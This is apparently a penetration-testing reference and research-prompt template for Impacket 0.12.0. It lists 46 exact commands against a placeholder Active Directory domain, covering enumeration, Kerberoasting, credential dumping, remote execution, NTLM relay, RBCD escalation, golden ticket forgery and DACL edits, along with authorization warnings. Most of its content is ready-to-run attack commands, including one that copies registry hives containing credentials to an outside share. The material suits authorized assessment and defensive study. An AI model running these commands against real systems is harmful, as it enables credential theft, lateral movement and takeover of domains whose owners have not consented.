# Impacket — command scenarios for deep research

Installed build: Impacket v0.12.0 from Debian `python3-impacket`. Every flag
below appears in the snapshots in this directory or in the script's own
subcommand help. Only five scripts have PATH wrappers; the rest run through
Python, so set the examples directory first:

```bash
export IMPACKET=/usr/share/doc/python3-impacket/examples
```

> **Intrusive and high-impact:** these scripts authenticate to remote hosts,
> dump credentials, relay authentication, forge tickets, and edit AD objects.
> Use only on authorized, in-scope systems with a defined rules-of-engagement
> window. Back up any AD object before modifying it.

## How to invoke

```text
@deep-research Map an authorized Active Directory assessment from
unauthenticated enumeration through Kerberoasting, credential dumping, and a
single RBCD escalation path using Impacket 0.12.0. For each phase cite the
relevant MS-* protocol specification, the Impacket example source, and at
least one field report; return exact commands, the artifact each leaves
behind, and a stop condition before any destructive or domain-wide action.
```

Create the demo inputs used below, replacing addresses and names with in-scope
targets:

```bash
mkdir -p ~/impacket-demo/{loot,evidence}
printf '10.10.10.5\n10.10.10.6\n' > ~/impacket-demo/targets.txt
printf 'alice\nbob\nsvc_sql\n' > ~/impacket-demo/users.txt
export IMPACKET=/usr/share/doc/python3-impacket/examples
```

Throughout, `ACME/alice:Password123` is a placeholder credential and
`10.10.10.5` is the domain controller.

## Scenario 1 — enumerate the domain before touching credentials

Start with read-only LDAP and SAMR queries. The goal is a user, computer,
delegation, and RPC-endpoint inventory that later phases can be scoped
against.

| # | Command | How to use |
|---|---------|------------|
| 1 | `python3 $IMPACKET/GetADUsers.py -all 'ACME/alice:Password123' -dc-ip 10.10.10.5` | All users, including accounts with no email |
| 2 | `python3 $IMPACKET/GetADUsers.py -user krbtgt 'ACME/alice:Password123' -dc-ip 10.10.10.5` | One account's attributes |
| 3 | `python3 $IMPACKET/samrdump.py -csv 'ACME/alice:Password123@10.10.10.5'` | SAMR user list as CSV |
| 4 | `python3 $IMPACKET/lookupsid.py 'ACME/alice:Password123@10.10.10.5' 5000` | Brute-force RIDs up to 5000 |
| 5 | `python3 $IMPACKET/lookupsid.py -domain-sids 'ACME/alice:Password123@10.10.10.5'` | Enumerate domain SIDs, not just local |
| 6 | `python3 $IMPACKET/findDelegation.py 'ACME/alice:Password123' -dc-ip 10.10.10.5` | Unconstrained, constrained, and RBCD relationships |
| 7 | `python3 $IMPACKET/netview.py -target 10.10.10.5 -noloop 'ACME/alice:Password123'` | One probe of sessions and logged-on users |
| 8 | `python3 $IMPACKET/rpcdump.py 'ACME/alice:Password123@10.10.10.5'` | RPC endpoints exposed through the endpoint mapper |

**Research questions**
- Which of these queries work with no credentials at all, and which require a
  valid bind?
- How do `samrdump` and `lookupsid` differ in coverage and in the events they
  generate?
- Which delegation finding is a real escalation path, and which is a benign
  default?
- What does `netview -noloop` miss compared with the default polling loop?

**Sources:** MS-SAMR, MS-LSAD, MS-RPCE, and MS-DRSR specifications; Impacket
example source; Windows Security event 4624/4634 documentation.
**Output:** `users.csv`, `sids.txt`, `delegation.txt`, and an RPC endpoint
table, each timestamped.

## Scenario 2 — Kerberos roasting and ticket handling

Kerberoasting needs any valid domain account; AS-REP roasting needs only a
user list and accounts with pre-authentication disabled. Both produce hashes
that leave the domain and crack offline.

| # | Command | How to use |
|---|---------|------------|
| 9 | `python3 $IMPACKET/GetUserSPNs.py 'ACME/alice:Password123' -dc-ip 10.10.10.5 -request -outputfile ~/impacket-demo/loot/kerberoast.txt` | Request TGS tickets for every SPN |
| 10 | `python3 $IMPACKET/GetUserSPNs.py 'ACME/alice:Password123' -dc-ip 10.10.10.5 -request-user svc_sql -save` | One account, save the ccache too |
| 11 | `python3 $IMPACKET/GetNPUsers.py 'ACME/' -usersfile ~/impacket-demo/users.txt -no-pass -dc-ip 10.10.10.5 -format hashcat -outputfile ~/impacket-demo/loot/asrep.txt` | AS-REP roast accounts without pre-auth |
| 12 | `python3 $IMPACKET/getTGT.py 'ACME/alice:Password123' -dc-ip 10.10.10.5` | Request a TGT and write `alice.ccache` |
| 13 | `export KRB5CCNAME=$PWD/alice.ccache && python3 $IMPACKET/getST.py -spn 'cifs/web01.acme.local' -k -no-pass 'ACME/alice@web01.acme.local'` | Service ticket from the ccache |
| 14 | `python3 $IMPACKET/getST.py -spn 'cifs/web01.acme.local' -impersonate Administrator 'ACME/EVIL$:MachinePass123!'` | S4U2Self/S4U2Proxy after an RBCD write |
| 15 | `python3 $IMPACKET/describeTicket.py alice.ccache` | Parse groups, SIDs, and ticket flags |
| 16 | `python3 $IMPACKET/ticketConverter.py alice.ccache alice.kirbi` | Convert ccache to kirbi for Windows tooling |

**Research questions**
- Which SPN-bearing accounts are privileged, and does the ticket's group list
  prove it before cracking?
- How does `-stealth` change the LDAP filter, and what does it hide?
- Why does `getST -k` need the FQDN in the target even when `-dc-ip` is set?
- What does `-force-forwardable` change, and when is it required for RBCD?
- Which hashcat mode consumes each output (`-m 13100` vs `-m 18200`)?

**Sources:** RFC 4120 and RFC 6806; MS-SPNG; Impacket `GetUserSPNs.py`,
`GetNPUsers.py`, and `getST.py` source; hashcat example-hash documentation.
**Output:** `kerberoast.txt`, `asrep.txt`, `alice.ccache`, and a
cracked-or-not status per account.

## Scenario 3 — dump and parse secrets

Remote dumping needs local administrator (or domain) rights. Offline parsing
of hives you already possess is the safer, repeatable half of the workflow.

| # | Command | How to use |
|---|---------|------------|
| 17 | `python3 $IMPACKET/secretsdump.py 'ACME/alice:Password123@10.10.10.5'` | SAM, LSA secrets, and cached credentials |
| 18 | `python3 $IMPACKET/secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c 'ACME/alice@10.10.10.5'` | Same dump with an NT hash |
| 19 | `python3 $IMPACKET/secretsdump.py -just-dc-user krbtgt -outputfile ~/impacket-demo/loot/acme 'ACME/Administrator:Password123@dc.acme.local'` | One NTDS account; writes `acme.ntds` |
| 20 | `python3 $IMPACKET/secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL` | Parse local hives with no network traffic |
| 21 | `python3 $IMPACKET/Get-GPPPassword.py 'ACME/alice:Password123@dc.acme.local'` | Find and decrypt GPP `cpassword` values in SYSVOL |
| 22 | `python3 $IMPACKET/GetLAPSPassword.py 'ACME/alice:Password123' -dc-ip 10.10.10.5 -computer WEB01` | Read one computer's LAPS password |
| 23 | `python3 $IMPACKET/secretsdump.py -use-vss -exec-method smbexec 'ACME/Administrator:Password123@dc.acme.local'` | VSS fallback when DRSUAPI is blocked |

**Research questions**
- Which secrets are recoverable with local admin but not domain admin, and
  vice versa?
- How does `-use-vss` change the artifacts and the detection profile compared
  with the default DRSUAPI path?
- What does `-history` add, and why does it matter for password reuse?
- When is offline hive parsing preferable to a remote dump?
- What does `GetLAPSPassword` require that `Get-GPPPassword` does not?

**Sources:** MS-DRSR; MS-LSAD; MS-SAMR; Microsoft LAPS documentation; Impacket
`secretsdump.py` source; Samba `secrets.idl` for LSA structures.
**Output:** `acme.sam`, `acme.secrets`, `acme.cached`, `acme.ntds`, plus a
credential inventory with the source of each secret.

## Scenario 4 — remote execution and artifact trade-offs

All five methods need administrative rights. They differ in the service or
object they abuse, the files they leave, and whether they return output.

| # | Command | How to use |
|---|---------|------------|
| 24 | `python3 $IMPACKET/psexec.py 'ACME/alice:Password123@10.10.10.5' 'cmd.exe /c whoami /all'` | Service + uploaded RemCom binary |
| 25 | `python3 $IMPACKET/smbexec.py -share C$ -mode SHARE 'ACME/alice:Password123@10.10.10.5' 'whoami /all'` | Batch-file service execution, no binary upload |
| 26 | `python3 $IMPACKET/wmiexec.py -share ADMIN$ 'ACME/alice:Password123@10.10.10.5' 'powershell -c Get-Process \| Select-Object -First 5'` | WMI process creation, output over SMB |
| 27 | `python3 $IMPACKET/dcomexec.py -object MMC20 'ACME/alice:Password123@10.10.10.5' 'whoami /all'` | DCOM execution through MMC20 |
| 28 | `python3 $IMPACKET/atexec.py 'ACME/alice:Password123@10.10.10.5' 'whoami /all'` | Task Scheduler execution |
| 29 | `python3 $IMPACKET/smbexec.py -shell-type powershell 'ACME/alice:Password123@10.10.10.5'` | Interactive shell with PowerShell |

**Research questions**
- Which method creates a service, which creates a scheduled task, and which
  creates neither?
- Which methods return stdout reliably, and which need a share to collect it?
- How do EDR and Windows event logs distinguish these five?
- What changes when `-nooutput` or `-silentcommand` is set?
- Which method survives a host where SMB writes to `C$` are blocked?

**Sources:** MS-SCMR; MS-WMI; MS-DCOM; MS-TSCH; Impacket example source;
Microsoft Sysmon event documentation.
**Output:** a comparison table of method, artifact, output path, and detection
signal, with one successful command per method.

## Scenario 5 — one controlled AD abuse chain

This is the highest-impact scenario. Run it only when the rules of engagement
name the target object and permit modification, and back up every object
first.

| # | Command | How to use |
|---|---------|------------|
| 30 | `python3 $IMPACKET/ntlmrelayx.py -tf ~/impacket-demo/targets.txt -smb2support -l ~/impacket-demo/loot` | Relay inbound NTLM to SMB targets with signing off |
| 31 | `python3 $IMPACKET/ntlmrelayx.py -t ldap://dc.acme.local -smb2support --escalate-user alice --dump-laps --dump-gmsa` | LDAP relay that escalates and dumps secrets |
| 32 | `python3 $IMPACKET/addcomputer.py -computer-name 'EVIL$' -computer-pass 'MachinePass123!' -method SAMR 'ACME/alice:Password123'` | Add a machine account under the default quota |
| 33 | `python3 $IMPACKET/rbcd.py -delegate-to 'CN=WEB01,CN=Computers,DC=acme,DC=local' -delegate-from 'EVIL$' -action write 'ACME/alice:Password123'` | Grant RBCD to the new machine account |
| 34 | `python3 $IMPACKET/getST.py -spn 'cifs/web01.acme.local' -impersonate Administrator 'ACME/EVIL$:MachinePass123!'` | S4U2Self/S4U2Proxy to a service ticket |
| 35 | `python3 $IMPACKET/dacledit.py -action backup -file ~/impacket-demo/evidence/web01-dacl.bak -target 'CN=WEB01,CN=Computers,DC=acme,DC=local' 'ACME/alice:Password123'` | Back up the DACL before any write |
| 36 | `python3 $IMPACKET/dacledit.py -action write -principal alice -rights FullControl -target 'CN=WEB01,CN=Computers,DC=acme,DC=local' 'ACME/alice:Password123'` | Grant FullControl on the object |
| 37 | `python3 $IMPACKET/ticketer.py -nthash <krbtgt_ntlm> -domain acme.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 Administrator` | Forge a golden ticket after a full NTDS dump |
| 38 | `python3 $IMPACKET/changepasswd.py -newpass 'NewPass123!' -reset -protocol smb-samr 'ACME/alice:Password123@10.10.10.5'` | Administrative password reset |

**Research questions**
- Which precondition must be true for `ntlmrelayx` to succeed against SMB, and
  how do you prove it without relaying?
- Does `MachineAccountQuota` allow `addcomputer`, and what is the value here?
- What exactly does `rbcd.py` write, and which follow-up ticket request proves
  it worked?
- How do you restore the DACL after `dacledit -action write`?
- What does `ticketer` need that a silver ticket does not, and vice versa?
- Which of these actions are reversible, and which are not?

**Sources:** MS-RBCD and MS-DS-AllowedToActOnBehalfOfOtherIdentity; MS-PAC;
MS-KILE; Microsoft `MachineAccountQuota` documentation; Impacket source;
Certipy/BloodHound documentation for the same paths.
**Output:** a before/after object state, a DACL backup file, one valid service
ticket, and a rollback command per modification.

## Scenario 6 — service-level interaction and evidence

Use the client scripts when you need a shell on SMB, MSSQL, or the registry
rather than a one-shot command.

| # | Command | How to use |
|---|---------|------------|
| 39 | `python3 $IMPACKET/smbclient.py 'ACME/alice:Password123@10.10.10.5'` | Interactive mini shell: `shares`, `use`, `ls`, `get` |
| 40 | `printf 'shares\nuse C$\nls\nexit\n' > ~/impacket-demo/smb.txt && python3 $IMPACKET/smbclient.py -inputfile ~/impacket-demo/smb.txt 'ACME/alice:Password123@10.10.10.5'` | Scripted SMB session |
| 41 | `sudo python3 $IMPACKET/smbserver.py -smb2support -username relay -password 'Pass123!' share /tmp/share` | Stand up an authenticated SMB share |
| 42 | `python3 $IMPACKET/mssqlclient.py -windows-auth 'ACME/alice:Password123@10.10.10.5'` | MSSQL shell; try `SELECT @@version` and `EXEC xp_cmdshell 'whoami'` |
| 43 | `python3 $IMPACKET/mssqlclient.py -windows-auth -file ~/impacket-demo/query.sql 'ACME/alice:Password123@10.10.10.5'` | Run a saved SQL batch |
| 44 | `python3 $IMPACKET/reg.py 'ACME/alice:Password123@10.10.10.5' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion' -s` | Recursive registry query |
| 45 | `python3 $IMPACKET/reg.py 'ACME/alice:Password123@10.10.10.5' backup -o '\\10.10.10.100\share'` | Back up SAM, SYSTEM, and SECURITY to a UNC path |
| 46 | `python3 $IMPACKET/services.py 'ACME/alice:Password123@10.10.10.5' list` | List services; `start`, `stop`, `config`, and `create` follow |

**Research questions**
- Which SMB client commands are implemented, and how do they differ from
  Samba's `smbclient`?
- Does `mssqlclient -windows-auth` need a domain account, a SQL login, or both?
- When is `reg backup` preferable to `secretsdump` for hive collection?
- What does `smbserver.py` need to receive a relayed or coerced authentication?
- Which of these actions change state, and which are read-only?

**Sources:** MS-SMB2; MS-TDS; MS-RRP; MS-SCMR; Impacket example source; Samba
`smbclient` documentation.
**Output:** a session transcript per protocol, a hive backup, and a
read-only/state-changing label on every command.

## Flag coverage checklist

| Help group / flag | Scenario |
|-------------------|----------|
| Universal target `[domain/]user[:pass]@host` | 1, 3, 4, 5, 6 |
| `-hashes`, `-no-pass`, `-k`, `-aesKey`, `-dc-ip`, `-dc-host` | 1, 2, 3, 4, 5 |
| `-target-ip`, `-port` | 1, 3, 4, 6 |
| `GetADUsers -all`, `-user` | 1 |
| `samrdump -csv`, `lookupsid -domain-sids` | 1 |
| `findDelegation -target-domain` | 1 |
| `netview -target`, `-noloop` | 1 |
| `GetUserSPNs -request`, `-request-user`, `-save`, `-outputfile`, `-stealth` | 2 |
| `GetNPUsers -request`, `-usersfile`, `-format`, `-outputfile` | 2 |
| `getTGT` identity and `-service` | 2 |
| `getST -spn`, `-impersonate`, `-altservice`, `-u2u`, `-self`, `-force-forwardable` | 2, 5 |
| `secretsdump -sam/-system/-security/-ntds`, `-just-dc*`, `-history`, `-use-vss`, `-exec-method`, `-outputfile` | 3 |
| `Get-GPPPassword -xmlfile`, `-share`, `-base-dir` | 3 |
| `GetLAPSPassword -computer`, `-outputfile` | 3 |
| `psexec -c`, `-path`, `-file`, `-service-name` | 4 |
| `smbexec -share`, `-mode`, `-shell-type` | 4 |
| `wmiexec -share`, `-nooutput`, `-silentcommand` | 4 |
| `dcomexec -object`, `-com-version`, `-A` | 4 |
| `atexec -session-id`, `-silentcommand` | 4 |
| `ntlmrelayx -t/-tf`, `-smb2support`, `-l`, `--escalate-user`, `--dump-laps`, `--dump-gmsa`, `--delegate-access`, `--shadow-credentials`, `-socks`, `--no-smb-server` | 5 |
| `addcomputer -computer-name`, `-computer-pass`, `-method`, `-no-add`, `-delete` | 5 |
| `rbcd -delegate-to`, `-delegate-from`, `-action` | 5 |
| `dacledit -action`, `-principal`, `-target`, `-rights`, `-file` | 5 |
| `owneredit -action`, `-new-owner`, `-target` | 5 |
| `ticketer -domain`, `-domain-sid`, `-nthash`, `-aesKey`, `-spn`, `-groups`, `-extra-sid`, `-impersonate` | 5 |
| `changepasswd -newpass`, `-newhashes`, `-protocol`, `-reset`, `-altuser` | 5 |
| `smbclient -inputfile`, `-outputfile` | 6 |
| `smbserver` share name/path, `-smb2support`, `-username`, `-password` | 6 |
| `mssqlclient -windows-auth`, `-db`, `-file`, `-show`, `-port` | 6 |
| `reg query/add/delete/save/backup` | 6 |
| `services start/stop/delete/status/config/list/create/change` | 6 |

Defaults: SMB 445, LDAPS 636, MSSQL 1433; `smbexec` mode `SHARE`; `wmiexec`
share `ADMIN$`; `psexec` service name random. Full text: the `help-*.txt`
snapshots in this directory.

## Scenario index

| Scenario | Task | Commands |
|----------|------|----------|
| 1 | Domain and host inventory | 8 |
| 2 | Kerberos roasting and tickets | 8 |
| 3 | Secret dumping and offline parsing | 7 |
| 4 | Remote execution trade-offs | 6 |
| 5 | Controlled AD abuse chain | 9 |
| 6 | Service interaction and evidence | 8 |
| **Total** | | **46** |

## Legal and safety

Every command here authenticates, dumps, executes, or modifies. None of it is
safe against an unowned system. Confirm written authorization, the in-scope
host list, the allowed techniques, and the rollback plan before Scenario 3.
Store dumped secrets encrypted, keep the DACL backup with the report, and
delete engagement credentials at close.
